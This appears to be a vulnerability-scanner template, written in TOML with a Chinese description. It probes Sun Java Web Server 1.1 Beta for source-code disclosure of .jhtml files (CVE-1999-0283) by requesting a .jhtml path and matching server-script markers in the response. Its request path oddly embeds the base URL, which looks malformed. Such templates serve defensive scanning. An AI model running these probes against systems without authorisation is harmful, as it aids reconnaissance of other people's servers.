[info]
author = "AVE"
description = "检测 Sun Java Web Server 1.1 Beta 是否泄露 .jhtml 文件源代码。通过请求一个 .jhtml 路径并检查响应是否包含 Java 服务端脚本标记（如 <% 或 out.print）来判断漏洞是否存在。"
id = "POC-AVE-1999-0472"
name = "CVE-1999-0283 PoC"
severity = "high"
tags = ["cve-1999-0283"]
vuln_id = [
    "CVE-1999-0283",
    "AVE-1999-0472",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/test.jhtml"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%",
    "out.print",
    "java.io",
    "ServletException",
]
